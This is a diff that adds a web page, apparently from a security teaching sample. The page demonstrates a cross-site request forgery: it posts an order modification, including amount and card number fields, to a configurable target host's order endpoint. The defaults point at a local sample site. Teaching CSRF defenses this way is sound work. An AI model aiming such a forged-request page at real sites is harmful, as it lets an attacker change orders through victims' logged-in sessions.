@@ -1,0 +1,50 @@
+﻿@{
+    ViewBag.Title = "CSRF Attacker";
+}
+
+<div class="jumbotron">
+    <h1>CSRF Attacker</h1>
+    <p class="lead">Demonstrates CSRF attack against the "Build Secure Systems" sample website</p>
+	<p>
+		This will do a cross-domain form post to the "Modify Order" page on the "Build Secure Systems"
+		sample website. If you are logged into that site, and the CSRF protections are disabled,
+		then the form post will be executed.
+	</p>
+</div>
+
+<form id="CSRFForm" action="set-by-script" method="post" target="_blank">
+	<table>
+		<tr>
+			<td>Site to attack:</td>
+			<td>
+				<input id="AttackHostInput" type="text" name="attackHost" value="http://localhost:1258/" />
+				<i>location of the "Build Secure Systems" site</i>
+			</td>
+		</tr>
+		<tr>
+			<td>Order Id:</td>
+			<td><input type="text" name="id" value="1" size="5" /></td>
+		</tr>
+		<tr>
+			<td>Amount:</td>
+			<td><input type="text" name="amount" value="0" size="5" /></td>
+		</tr>
+		<tr>
+			<td>Card Number:</td>
+			<td><input type="text" name="cardNumber" value="0000000000000000" size="20" /></td>
+		</tr>
+		<tr>
+			<td></td>
+			<td><input type="submit" value="send attack" /></td>
+		</tr>
+	</table>
+</form>
+
+<script type="text/javascript">
+	$(function () {
+		$("#CSRFForm").on("submit", function () {
+			var form = $(this)[0];
+			form.action = $("#AttackHostInput").val() + "/AntiCSRF/ModifyOrderPost";
+		})
+	});
+</script>
